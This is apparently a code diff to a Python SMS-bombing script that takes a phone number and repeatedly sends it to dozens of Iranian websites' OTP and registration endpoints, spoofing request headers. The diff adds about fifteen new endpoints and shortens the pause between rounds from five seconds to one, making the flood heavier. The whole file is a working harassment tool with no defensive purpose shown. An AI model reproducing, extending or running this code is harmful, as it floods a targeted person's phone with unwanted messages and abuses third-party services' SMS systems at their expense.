@@ -1,7 +1,9 @@
 import requests
 from alive_progress import alive_bar
 from fake_headers import Headers
-import time
+from time import sleep
+from colorama import Fore, Style
+
 
 headers = Headers()
 
@@ -12,13 +14,14 @@ def send_request(api_name, api_url, data):
     try:
         response = requests.post(api_url, headers=generated_headers, json=data)
         response.raise_for_status()
-        return True, f"\033[92m[+] {api_name}:\033[0m OK"
+
+        return f"{Fore.GREEN}[+] {api_name}:{Style.RESET_ALL} OK"
     except requests.exceptions.RequestException as e:
-        return False, f"\033[91m[-] {api_name}:\033[0m Failed - {e}"
+        return f"{Fore.RED}[-] {api_name}:{Style.RESET_ALL} Failed - {e}"
 
 
 def main():
-    phone_number = input("\033[94mEnter the phone number:\033[0m ")
+    phone_number = input(f"{Fore.BLUE}Enter the phone number:{Style.RESET_ALL} ")
 
     apis = [
         {
@@ -159,16 +162,91 @@ def main():
             "url": "https://www.tebinja.com/api/v1/users",
             "data": {"username": phone_number},
         },
+        {
+            "name": "Bit24",
+            "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Rojashop",
+            "url": "https://rojashop.com/api/send-otp-register",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Paklean",
+            "url": "https://client.api.paklean.com/download",
+            "data": {"tel": phone_number},
+        },
+        {
+            "name": "Khodro45",
+            "url": "https://khodro45.com/api/v1/customers/otp/",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Delino",
+            "url": "https://www.delino.com/user/register",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "DigikalaJet",
+            "url": "https://api.digikalajet.ir/user/login-register/",
+            "data": {"phone": phone_number},
+        },
+        {
+            "name": "Miare",
+            "url": "https://www.miare.ir/api/otp/driver/request/",
+            "data": {"phone_number": phone_number},
+        },
+        {
+            "name": "Dosma",
+            "url": "https://app.dosma.ir/api/v1/account/send-otp/",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Ostadkr",
+            "url": "https://api.ostadkr.com/login",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Sibbazar",
+            "url": "https://sandbox.sibbazar.com/api/v1/user/invite",
+            "data": {"username": phone_number},
+        },
+        {
+            "name": "Namava",
+            "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
+            "data": {"UserName": f"+98{phone_number[1:]}"},
+        },
+        {
+            "name": "Shab",
+            "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Bitpin",
+            "url": "https://api.bitpin.org/v2/usr/signin/",
+            "data": {"phone": phone_number},
+        },
+        {
+            "name": "Taaghche",
+            "url": "https://gw.taaghche.com/v4/site/auth/signup",
+            "data": {"contact": phone_number},
+        },
+        # {
+        #     "name": "Digipay",
+        #     "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
+        #     "data": {"cellNumber": phone_number},
+        # },
     ]
 
     while True:
         with alive_bar(len(apis), theme="smooth") as progress_bar:
             for api in apis:
-                success, message = send_request(api["name"], api["url"], api["data"])
+                message = send_request(api["name"], api["url"], api["data"])
                 progress_bar()
                 print(message)
 
-        time.sleep(5)
+        sleep(1)
 
 
 if __name__ == "__main__":
